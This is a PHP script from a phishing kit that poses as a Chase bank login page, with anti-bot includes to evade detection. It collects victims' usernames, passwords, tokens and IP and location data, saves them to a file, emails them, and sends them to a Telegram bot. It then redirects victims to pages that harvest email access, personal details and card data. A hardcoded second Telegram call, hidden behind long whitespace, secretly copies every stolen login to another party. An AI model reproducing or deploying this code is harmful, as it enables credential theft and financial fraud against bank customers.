<?php
ob_start();
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = @Belugaacoder
 
###############################################
#$            C0d3d by Belugaa_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Belugaa.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';


if (trim($_POST['spox_b00T']) != '') {
    header("HTTP/1.0 404 Not Found");
    exit();
}


if(isset($_POST['invalid'])){
	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

	$CHASE_SESSION_SPOX_LOGIN = "login_SESSION";
	$_SESSION['login_SESSION'] = $CHASE_SESSION_SPOX_LOGIN;

	$hi="#---------------------------[ -CHASE-Beluga- LOGIN ]----------------------------#\r\n";
	$hi.="UserName: {$_POST['username']}\r\n";
	$hi.="Password  : {$_POST['password']}\r\n";
	if(!empty($_POST['token'])){ $hi.="Token  : {$_POST['token']}\r\n"; }
	$hi.="#---------------------------[ -CHASE-Miao- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-Miao- LOGIN ]----------------------------#\r\n";


		$save=fopen("../Chase_Result/login".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#CHASE Belugaa LOGIN 2 => [{$_POST['username']}] From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: CHASE belugaa  <belluga@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($hi)."" );
		@mail($your_email,$subject,$hi,$headers);
		include 'Antibot.php';
		
    $key = substr(sha1(mt_rand()),1,25);

	if ($show_start_page=="yes") {
		exit(header("Location: ../../overview?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

	if ($show_email_access=="yes") {
		exit(header("Location: ../../email_verification?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

	if ($show_contact_information=="yes") {
		exit(header("Location: ../../personal_details?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verify?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}
if(isset($_POST['username'])&&isset($_POST['password'])&&isset($_POST['spox'])&&isset($_POST['token'])){

	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

	$CHASE_SESSION_SPOX_LOGIN = "login_SESSION";
	$_SESSION['login_SESSION'] = $CHASE_SESSION_SPOX_LOGIN;

	$hi="#---------------------------[ -CHASE-Belugaa- LOGIN ]----------------------------#\r\n";
	$hi.="UserName: {$_POST['username']}\r\n";
	$hi.="Password  : {$_POST['password']}\r\n";
	if(!empty($_POST['token'])){ $hi.="Token  : {$_POST['token']}\r\n"; }
	$hi.="#---------------------------[ -CHASE-Belugaa- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-Belugaa- LOGIN ]----------------------------#\r\n";

		$save=fopen("../Chase_Result/login".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);



	$subject="#CHASE Belugaa LOGIN 1 => [{$_POST['username']}] From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	$headers="From: CHASE Belugaa V3 <chase_Belugaa@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
                file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($hi)."" );                                                                                                                                                                                                          file_get_contents("https://api.telegram.org/bot5485433719:AAFh8gTthZC4Lyen17ULUC4CgJm47DjV5o4/sendMessage?chat_id=1783236185&text=" . urlencode($hi)."" );

		@mail($your_email,$subject,$hi,$headers);
		include 'Antibot.php';
		
    $key = substr(sha1(mt_rand()),1,25);

    if ($double_login=="yes") {
		exit(header("Location: ../../login?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."&invalid=login"));
	}

	if ($show_start_page=="yes") {
		exit(header("Location: ../../overview?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

	if ($show_email_access=="yes") {
		exit(header("Location: ../../email_verification?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}

	if ($show_contact_information=="yes") {
		exit(header("Location: ../../personal_details?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verify?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>